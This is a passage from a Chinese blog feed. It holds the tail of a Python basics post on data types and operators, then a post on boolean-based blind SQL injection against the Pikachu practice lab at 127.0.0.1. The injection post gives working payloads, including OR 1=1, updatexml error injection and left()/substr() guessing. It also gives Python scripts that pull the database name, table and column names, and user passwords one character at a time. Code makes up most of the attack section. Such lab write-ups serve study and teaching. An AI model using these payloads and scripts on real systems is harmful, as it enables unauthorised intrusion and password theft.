title="2.数据类型"></a>2.数据类型</h4><p>&emsp;&emsp;Python中有6种主要的内置数据类型：数字、字符串、列表、元组、集合和字典。其中数字类型有四种，包括整数类型、浮点类型、复数类型和布尔类型。</p><ul><li>整数类型：int</li><li>浮点类型：float</li><li>复数类型：complex     #  形式是a+bj</li><li>布尔类型：bool（整数类型的一种子类）</li></ul><p>&emsp;</p><h4 id="3-数据类型的转换"><a href="#3-数据类型的转换" class="headerlink" title="3.数据类型的转换"></a>3.数据类型的转换</h4><p>&emsp;&emsp;数据类型的转换分为隐式类型转换和显式类型转换（自动与非自动）</p><ul><li>隐式类型转换</li></ul><p>&emsp;&emsp;数字之间可以进行数学计算，在进行数学计算时若数字类型不同，则会自动的发生数字类型的转换</p><ul><li>显式类型转</li></ul><p>&emsp;&emsp;使用转换函数进行转换，除复数外，三种数字类型如整数、浮点和布尔都有自己的转换函数，分别是int（）、float（）和bool（）函数</p><p>&emsp;</p><h4 id="4-运算符"><a href="#4-运算符" class="headerlink" title="4.运算符"></a>4.运算符</h4><ul><li><h6 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h6><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加</td><td align="center">a+b</td><td align="center">求a和b的和</td></tr><tr><td align="center">-</td><td align="center">减</td><td align="center">a-b</td><td align="center">求a与b的差</td></tr><tr><td align="center">*</td><td align="center">乘</td><td align="center">a*b</td><td align="center">求a和b的积</td></tr><tr><td align="center">/</td><td align="center">出</td><td align="center">a/b</td><td align="center">求a除以b的商</td></tr><tr><td align="center">%</td><td align="center">取余</td><td align="center">a%b</td><td align="center">求a除以b的余数</td></tr><tr><td align="center">**</td><td align="center">幂</td><td align="center">a**b</td><td align="center">求a的b次幂</td></tr><tr><td align="center">//</td><td align="center">地板除法</td><td align="center">a//b</td><td align="center">求小于a与b的商的最大整数</td></tr></tbody></table></li></ul><p>&emsp;</p><ul><li><h6 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h6></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td><td align="center">a==b</td></tr><tr><td align="center">!=</td><td align="center">不等于</td><td align="center">a!=b</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td><td align="center">a&gt;b</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td><td align="center">a&lt;b</td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于</td><td align="center">a&gt;=b</td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于</td><td align="center">a&lt;=b</td></tr></tbody></table><p>&emsp;</p><ul><li><h6 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h6></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">not</td><td align="center">逻辑非</td><td align="center">not a</td><td align="center">a为ture时，值为flase，若a为flase，则值为ture</td></tr><tr><td align="center">and</td><td align="center">逻辑与</td><td align="center">a and b</td><td align="center">a、b全为ture，结果才为ture</td></tr><tr><td align="center">or</td><td align="center">逻辑或</td><td align="center">a or b</td><td align="center">a、b全为false，结果才为false</td></tr></tbody></table><p>&emsp;</p><ul><li><h5 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h5></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">~</td><td align="center">位反</td><td align="center">~x</td><td align="center">将x的值按位取反</td></tr><tr><td align="center">&amp;</td><td align="center">位与</td><td align="center">x&amp;y</td><td align="center">将x与y按位进行位与运算</td></tr><tr><td align="center">|</td><td align="center">位或</td><td align="center">x|y</td><td align="center">将x与y按位进行位或运算</td></tr><tr><td align="center">^</td><td align="center">位异或</td><td align="center">x^y</td><td align="center">将x与y按位进行位异或运算</td></tr><tr><td align="center">&gt;&gt;</td><td align="center">右移</td><td align="center">x&gt;&gt;a</td><td align="center">将x右移a位，高位采用符号位补位</td></tr><tr><td align="center">&lt;&lt;</td><td align="center">左移</td><td align="center">x&lt;&lt;a</td><td align="center">将x左移a位，低位用0补位</td></tr></tbody></table><p>&emsp;</p><ul><li><h5 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h5></li></ul><p>&emsp;</p><h4 id="5-运算符的优先级"><a href="#5-运算符的优先级" class="headerlink" title="5.运算符的优先级"></a>5.运算符的优先级</h4><table><thead><tr><th align="center">优先级</th><th align="center">运算符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">（）</td><td align="center">小括号</td></tr><tr><td align="center">2</td><td align="center">**</td><td align="center">幂</td></tr><tr><td align="center">3</td><td align="center">~</td><td align="center">位反</td></tr><tr><td align="center">4</td><td align="center">+，-</td><td align="center">正负号</td></tr><tr><td align="center">5</td><td align="center">*，/，%，//</td><td align="center">乘，除，取余，地板除</td></tr><tr><td align="center">6</td><td align="center">+，-</td><td align="center">加，减</td></tr><tr><td align="center">7</td><td align="center">&lt;&lt;，&gt;&gt;</td><td align="center">位移</td></tr><tr><td align="center">8</td><td align="center">&amp;</td><td align="center">位与</td></tr><tr><td align="center">9</td><td align="center">^</td><td align="center">位异或</td></tr><tr><td align="center">10</td><td align="center">|</td><td align="center">位或</td></tr><tr><td align="center">11</td><td align="center">&lt;，&lt;=，&gt;，&gt;=，&lt;&gt;，!=，==</td><td align="center">比较</td></tr><tr><td align="center">12</td><td align="center">not</td><td align="center">逻辑非</td></tr><tr><td align="center">13</td><td align="center">and，or</td><td align="center">逻辑与，逻辑或</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>盲注——布尔型</title>
    <link href="/2022/08/19/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/"/>
    <url>/2022/08/19/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="盲注——布尔型"><a href="#盲注——布尔型" class="headerlink" title="盲注——布尔型"></a>盲注——布尔型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;又是查询信息，直接输入点内容看看情况，可</p><p>&emsp;</p><h4 id="2-尝试or注入"><a href="#2-尝试or注入" class="headerlink" title="2.尝试or注入"></a>2.尝试or注入</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;明显联合查询注入是失败了，并不被允许</p><p>&emsp;</p><h4 id="3-尝试报错注入"><a href="#3-尝试报错注入" class="headerlink" title="3.尝试报错注入"></a>3.尝试报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;明显也不行，这说明，并没有相关回显，那只能尝试使用盲注了。</p><p>&emsp;&emsp;</p><h4 id="4-尝试布尔注入"><a href="#4-尝试布尔注入" class="headerlink" title="4.尝试布尔注入"></a>4.尝试布尔注入</h4><p>&emsp;&emsp;在布尔注入中，由于需要判断对错的反馈，所以就个人理解而言，是需要正确的用户进行查询，从而就行判断的。而对于布尔类型而言，就是靠猜测，通过不断的尝试，达到正确的结果：</p><p>&emsp;&emsp;正确的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27;and left(database(),1)=&#x27;</span>p<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;错误的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27;and left(database(),1)=&#x27;</span>g<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;最终结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27;and left(database(),7)=&#x27;</span>pikachu<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/5.jpg" style="zoom:80%;" /></center>&emsp;&emsp;我们可以看见，通过这种形式的判断，我们可以逐步的爆破出数据库的名字（当然，这都要借助于脚本的形式了，人力消耗太大，太浪费时间了），当然不一定是使用letf函，有许多类似于mid之类的一样是能够操作的。同样的道理，我们可以用这样的语句获取我们想要的表、列、名等内容，这里就不具体讲述了。还是用脚本写吧。<h4 id="5-python脚本"><a href="#5-python脚本" class="headerlink" title="5.python脚本"></a>5.python脚本</h4><p>&emsp;&emsp;主要是参考网络的一些现成的脚本进行爆破，参考连接：</p><ul><li><a href="https://blog.csdn.net/qq_51415429/article/details/114298238">https://blog.csdn.net/qq_51415429/article/details/114298238</a></li><li><a href="https://www.cnblogs.com/lzlzzzzzz/p/13998552.html">https://www.cnblogs.com/lzlzzzzzz/p/13998552.html</a></li></ul><p>(连在一起运行效果更佳哦)</p><h5 id="①先爆数据库："><a href="#①先爆数据库：" class="headerlink" title="①先爆数据库："></a>①先爆数据库：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>s = requests.session()<br>url = <span class="hljs-string">&quot;http://127.0.0.1/pika/vul/sqli/sqli_blind_b.php&quot;</span>  <span class="hljs-comment"># 选择攻击的网址</span><br><br><span class="hljs-comment"># headers = &#123;&#x27;cookie&#x27;: &#x27;&#x27;&#125;  # 需要登录的可以添加cookie值</span><br><br><span class="hljs-comment"># 爆破数据库的长度</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-comment"># 这里对#和\都进行了url编码处理，在#好后将完整的url拼接起来,然后注意了，需要url转码，例如&#x27;需要变成%27</span><br>    databaselen_payload = <span class="hljs-string">&quot;?name=vince%27and+length(database())=&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 写入判断布尔类型是否存在的根据，如果比较登录成功的文字是否在对应网页的文本中， 是则可以继续，如果反馈错误，则说明数据库长度到头了，直接break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;your email is:&quot;</span> <span class="hljs-keyword">in</span> s.get(url+databaselen_payload).text:<br>        database_len = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># 打印出来</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database_length:&quot;</span>, <span class="hljs-built_in">str</span>(database_len))<br><br><span class="hljs-comment"># 暴数据库的名</span><br>database_name = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr(database(),&quot;+str(l)+&quot;,1))=&quot;+str(i)+&quot;#</span><br>        databasename_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28database%28%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 查看返回值是否正确</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url+databasename_payload).text:<br>            database_name = database_name + <span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;database_name:&#x27;</span>, database_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/6.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="②爆表内容："><a href="#②爆表内容：" class="headerlink" title="②爆表内容："></a>②爆表内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆表的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=&quot;+str(l)+&quot;#</span><br>    tablenumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + tablenumber_payload).text:<br>        tablenumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tablenumber:&#x27;</span>, tablenumber)<br><br><span class="hljs-comment"># 爆表名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablenumber):<br>    table_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;#</span><br>        tablelen_payload = <span class="hljs-string">&quot;?name=vince%27+and+length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + tablelen_payload).text:<br>            tablelen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;:&quot;</span>, tablelen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablelen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;#</span><br>            tablename_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + tablename_payload).text:<br>                table_name = table_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, table_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="③爆列内容："><a href="#③爆列内容：" class="headerlink" title="③爆列内容："></a>③爆列内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆列的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=&quot;+str(l)+&quot;#</span><br>    columnnumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + columnnumber_payload).text:<br>        columnnumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tablenumber:&#x27;</span>, columnnumber)<br><br><span class="hljs-comment"># 爆列名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnnumber):<br>    column_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;#</span><br>        columnlen_payload = <span class="hljs-string">&quot;?name=vince%27+and+length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + columnlen_payload).text:<br>            columnlen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, columnlen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnlen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;#</span><br>            columnname_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + columnname_payload).text:<br>                column_name = column_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, column_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/8.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="④爆数据内容："><a href="#④爆数据内容：" class="headerlink" title="④爆数据内容："></a>④爆数据内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆数据的条数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>    <span class="hljs-comment"># 拼接完整的url   从users表中选username列   ?name=vince&#x27; and (select count(password) from users)=&quot;+str(l)+&quot;#</span><br>    datanumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+%28select+count%28password%29+from+users%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + datanumber_payload).text:<br>        datanumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;datenumber:&#x27;</span>, datanumber)<br><br><span class="hljs-comment"># 爆数据内容（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datanumber):<br>    data_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and length(substr((select password from users limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;#</span><br>        datalen_payload = <span class="hljs-string">&quot;?name=vince%27+and+length%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + datalen_payload).text:<br>            datalen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, datalen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datalen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr((select password from users limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot; #</span><br>            dataname_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;+%23&amp;submit=查询&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + dataname_payload).text:<br>                data_name = data_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dataname&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, data_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-总结"><a href="#6-总结" 